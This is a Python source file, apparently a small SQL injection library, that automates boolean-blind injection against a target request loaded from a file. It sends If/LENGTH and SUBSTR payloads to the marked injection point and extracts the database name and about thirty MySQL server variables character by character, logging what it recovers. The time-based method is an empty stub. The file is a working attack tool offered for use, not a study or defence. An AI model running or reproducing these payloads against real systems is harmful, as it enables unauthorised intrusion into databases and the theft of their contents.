# By Martin v1.0.0
'''
This is an SQL injection automatic information acquisition API
<test.py>
from MartSQLIAPI import SQLIInformationRetriever

sqls = SQLIInformationRetriever()
sqls.loadfile('x://xxx/xxxx/payload.txt','<@MARTIN>')
sqls.method(echo="Login")
sqls.setlog()
sqls.run()
'''

import random
import requests
import sys
from loguru import logger
from .Processing_messages import Processing_messages

class SQLIInformationRetriever(object):

    def __init__(self):
        self.__log = False
        self.__method = ''
        self.__point = ''
        self.__filedata = ''
        self.__echo = ''
        self.__sqlquery = [
            "database()",
            "@@basedir",
            "@@character_set_client",
            "@@character_set_connection",
            "@@character_set_database",
            "@@character_set_results",
            "@@character_set_server",
            "@@collation_server",
            "@@init_connect",
            "@@interactive_timeout",
            "@@language",
            "@@log_error",
            "@@long_query_time",
            "@@lower_case_table_names",
            "@@max_allowed_packet",
            "@@max_connections",
            "@@max_user_connections",
            "@@net_read_timeout",
            "@@net_write_timeout",
            "@@pid_file",
            "@@port",
            "@@server_id",
            "@@skip_external_locking",
            "@@socket",
            "@@sort_buffer_size",
            "@@sql_mode",
            "@@table_definition_cache",
            "@@thread_cache_size",
            "@@tmpdir",
            "@@wait_timeout"
        ]
        self.__send = Processing_messages()

    def __save_log(self, data):
        with open(self.__echo + '.txt', 'a', encoding='utf-8') as file:
            file.write(data + '\n')

    def setlog(self):
        self.__log = True
        self.__init_loger()

    def __init_loger(self):
        logger.remove()
        logger.add(
            sink=sys.stdout,
            format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
            level="INFO"
        )

    def loadfile(self, filepath, point):
        data = ''
        try:
            with open(filepath, 'r', encoding='utf-8') as file:
                data = file.read()
        except Exception as e:
            if self.__log:
                logger.error("no files found!")
            else:
                print("no files found!")
            return False
        else:
            if point not in data:
                if self.__log:
                    logger.error("Replace injection point name is different!")
                else:
                    print("Replace injection point name is different!")
                return False
            self.__filedata = data
            self.__point = point

    def method(self, method=False, echo=''):
        if method:
            self.__method = 'time'
        elif not method:
            self.__method = 'bool'
            self.__echo = echo

    def run(self):
        if self.__method == 'bool' and self.__point and self.__filedata:
            self.__bool_inject(self.__echo)
        elif self.__method == 'time' and self.__point and self.__filedata:
            self.__time_inject()
        else:
            if self.__log:
                logger.error("Call exception, 1.loadfile 2.method 3.run")
            else:
                print("Call exception, 1.loadfile 2.method 3.run")
            return False

    def __bool__inject_get_length(self, sql, echo):
        for len in range(1, 1024):
            payload = f'If(LeNgTh(({sql}))={len},1,0)'
            _, statuscode, content, _ = self.__send.Main('http', self.__filedata, self.__point, payload)
            if statuscode == 200:
                if echo in content:
                    return len
            else:
                if self.__log:
                    logger.error("The server cannot reach!")
                else:
                    print("The server cannot reach!")
                return False
        return False

    def __bool__inject_get_data(self, len, sql, echo):
        flag = ''
        for len1 in range(1, len + 1):
            for word in range(32, 128):
                payload = f'If(SubSTR(({sql}),{len1},1)=\'{chr(word)}\',1,0)'
                _, statuscode, content, _ = self.__send.Main('http', self.__filedata, self.__point, payload)
                if statuscode == 200:
                    if echo in content:
                        flag += chr(word)
                        break
                else:
                    if self.__log:
                        logger.error("The server cannot reach!")
                    else:
                        print("The server cannot reach!")
                    return False
        return flag


    def __bool_inject(self, echo):
        flag = ''
        for sql in self.__sqlquery:
            len = self.__bool__inject_get_length(sql, echo)
            if len:
                flag = self.__bool__inject_get_data(len, sql, echo)
            if self.__log:
                logger.warning(sql + ">" + (flag or "None"))
            else:
                print(sql + ">" + (flag or "None"))
            self.__save_log(sql + ">" + (flag or "None"))

    def __time_inject(self):
        pass